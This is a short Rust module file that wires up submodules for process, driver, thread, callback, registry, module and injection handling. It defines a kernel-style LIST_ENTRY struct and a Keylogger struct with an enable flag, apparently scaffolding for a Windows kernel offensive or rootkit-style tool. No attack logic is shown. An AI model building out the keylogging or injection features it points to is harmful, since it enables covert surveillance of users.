#![allow(non_camel_case_types)]
#![allow(non_snake_case)]

use crate::vars::Options;

pub use {
    process::*,
    driver::*,
    thread::*,
    callback::*,
    registry::*,
    module::*,
    injection::*,
};

pub mod process;
pub mod thread;
pub mod callback;
pub mod driver;
pub mod registry;
pub mod module;
pub mod injection;

// Custom LIST_ENTRY
#[repr(C)]
pub struct LIST_ENTRY {
    pub Flink: *mut LIST_ENTRY,
    pub Blink: *mut LIST_ENTRY,
}

// Keylogger
#[repr(C)]
#[derive(Debug)]
pub struct Keylogger {
    pub enable: bool
}

// Input for information that needs to be listed
#[repr(C)]
pub struct EnumerateInfoInput {
    pub options: Options
}
